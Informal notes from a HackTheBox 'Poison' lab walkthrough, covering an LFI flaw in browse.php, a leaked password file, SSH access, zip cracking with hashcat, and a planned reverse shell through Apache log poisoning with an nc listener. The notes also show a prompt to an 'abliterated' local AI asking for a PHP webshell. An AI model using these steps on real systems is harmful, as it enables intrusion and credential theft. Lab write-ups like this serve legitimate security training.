```sh
# util for changing ip due to vpn
export HTBIP=10.129.1.254
```
┌─[user@parrot]─[~]
└──╼ $nmap -T4 -F $HTBIP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-28 13:24 UTC
Nmap scan report for 10.10.10.84
Host is up (0.098s latency).
Not shown: 98 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

k, dirb or uh. crap. what's the rust util to scan subdirs on a web server?

damn.

I noticed a pattern.

I over-engineer stuff.

nmap -p 80,443 --script http-enum 10.10.10.84

literally just that. that was the answer. ^^

|   /info.php: Possible information file
|_  /phpinfo.php: Possible information file


okay ALSO, I forgot to just check `/` in the website. I really get lost down rabbitholes quickly.

http://10.10.10.84/browse.php?file=listfiles.php

```
Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt ) 
```

browse.php: memory exhausted

pwdbackup.txt

...

python - base64 decode WITHOUT docs and WITHOUT internet - how to look up modules and their functions and docstrings

import base64

dir()

help()

for 
while
repr

...

it failed, but i think i got close.


    Charix!2#4%6&8(0


OKAY, so apparently, `browse.php` can include other files. thank you hackthebox guided mode.
OH DUH, I didn't read the title bar. Yep.

"apache access logs location"

/var/log/??

http://10.10.10.84/browse.php?file=/var/log/apache2/access.log

nope, no file

http://10.10.10.84/browse.php?file=/var/log/apache2/access.log - generate me a bunch of candidates that are curlable

erm. fuck it. what if we just. ssh charix@1234 - getting impatient


ssh charix@10.10.10.84

well, it doesnt give us ...yes it does give us TCP replies.

charix@10.10.10.84: Permission denied (publickey,keyboard-interactive).

looks like server forces pubkey? but `keyboard-interactive` makes me think.

OH,

ssh -o PubkeyAuthentication=no charix@10.10.10.84 

so, StackOverflow is...not "wrong" but "overly verbose"...

`-o PubkeyAuthentication=no` is the option we actually need. `PreferredAuthentications=password` is not needed.

pull a rabbit out a hat, that's tricky

    charix@Poison:~ % 

wew, local shell.

`linPEAS`? feeling lazy perhaps? yes. but. bad habits die hard.

what do. dont want to be lazy. lets manually enum some shit.
- we know it runs php
- we know it has a LFI vuln
- erm. its FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017
ctrl-c LOCALAI ctrl-v what do

wew user flag `~/user.txt`


    scp -o PubkeyAuthentication=no charix@10.10.10.84:~/secret.zip .
    Charix!2#4%6&8(0

let's uh. apparently we can steal the .zip password

but uh. i have a local gpu, so...let's see if we can crack it :3c

hashcat -m 3600 -a 0 secret.hash /usr/share/wordlists/rockyou.txt
...


hashcat -m 1500 -a 0 secret.hash /usr/share/wordlists/rockyou.txt


so, also, for some reason, guided mode wants me to look at apache logs.

    http://$HTBIP/browse.php?file=X

10.129.1.254

ffuf? nah. lets just try a few dirs.
it depends on the os. wait. we already have user shell.

    ssh -o PubkeyAuthentication=no charix@$HTBIP


```sh

# download tree as a file so we can page thru it
tree /var/log/ > /tmp/mytree.txt

exit
# from attacker shell

scp -o PubkeyAuthentication=no charix@$HTBIP:/tmp/mytree.txt ./mytree.txt

```

...oh crap. `tree` isn't a command.

here I am, over-engineering stuff.

```
Warning: include(a): failed to open stream: No such file or directory in /usr/local/www/apache24/data/browse.php on line 2

Warning: include(): Failed opening 'a' for inclusion (include_path='.:/usr/local/www/apache24/data') in /usr/local/www/apache24/data/browse.php on line 2
```

why not just `cd` and `ls` and just poke around?

    /var/log/httpd-access.log


"What user is the webserver running as?"
no idea. it's not `root` or `wheel`.

I need to use a php webshell, actually. let's uh.

I'm curious. I'm going to use KoboldCPP to run a local AI model and ask it:

    I'm hacking the Poison HTB box. reply only with code. generate a PHP webshell to connect to `10.10.14.175` (attacker IP) on port 4444 (i will be running `nc -nvlp 4444` to accept victim connections)

after i gen the php webshell, i need to run this on my attacker machine:

    curl -vvvk http://$HTBIP/browse.php?file=./revshell.php

of course, also after creating the file `revshell.php` and populating it with whatever my localAI abliterated model spits out, seen below:

    echo 'FILL ME IN WITH AI REV SHELL' > /usr/local/www/apache24/data/revshell.php

okay...I don't have access as user `charix` to modify files under `/usr/local/www/apache24/data/revshell.php`.

WAIIIIT...the hint says `poison the access log with...`. This means I need to be a bit more crafty,

I need to send HTTP traffic that includes a webshell, that causes the apache process to spit PHP code into `/var/log/httpd-access.log`.

After I poison the log, I can trigger the victim to execute the web shell by running this code from the attacker machine:

    curl -vvvk http://$HTBIP/browse.php?file=/var/log/httpd-access.log

See [./poison-log.bash](./poison-log.bash)